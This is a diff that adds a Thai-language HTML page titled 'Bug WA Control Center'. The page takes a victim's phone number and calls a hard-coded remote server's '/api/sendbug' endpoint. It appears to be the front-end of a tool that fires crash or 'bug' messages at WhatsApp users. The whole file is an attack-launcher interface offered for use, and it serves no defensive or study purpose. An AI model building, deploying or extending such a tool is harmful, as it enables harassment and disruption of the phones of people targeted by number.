@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bug WA Control Center</title>
+    <style>
+        body { font-family: sans-serif; background: #121212; color: #fff; text-align: center; padding: 20px; }
+        .box { background: #1e1e1e; padding: 20px; border-radius: 10px; max-width: 400px; margin: auto; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
+        input, button { width: 90%; padding: 12px; margin: 10px 0; border-radius: 5px; border: none; font-size: 16px; }
+        input { background: #333; color: #fff; }
+        button { background: #ff4757; color: white; font-weight: bold; cursor: pointer; }
+        button:hover { background: #ff6b81; }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <h2>BUG WA CONTROLLER</h2>
+        <p>ระบุเบอร์เป้าหมาย (รวมรหัสประเทศ เช่น 62xxx / 66xxx)</p>
+        <input type="text" id="target" placeholder="ตัวอย่าง: 66654321xxx">
+        <button onclick="kirimBug()">ยิง Bug (Send Command)</button>
+    </div>
+
+    <script>
+        function kirimBug() {
+            let targetNumber = document.getElementById('target').value;
+            if(!targetNumber) return alert('กรุณาใส่เบอร์เป้าหมายก่อนครับ');
+
+            // ⚠️ เปลี่ยนโดเมนและพอร์ตให้ตรงกับ IP/Port ของ Panel Pterodactyl ของคุณ
+            let ipPanel = "http://78.154.103.37"; 
+            let portPanel = "13422"; 
+
+            let fullUrl = `${ipPanel}:${portPanel}/api/sendbug?number=${targetNumber}`;
+
+            fetch(fullUrl)
+                .then(response => {
+                    alert("ส่งคำสั่งยิงไปที่เซิร์ฟเวอร์เรียบร้อยแล้ว!");
+                })
+                .catch(error => {
+                    console.error(error);
+                    alert("เชื่อมต่อเซิร์ฟเวอร์ล้มเหลว ตรวจสอบ IP/Port หรือการรันสคริปต์บน Panel");
+                });
+        }
+    </script>
+</body>
+</html>
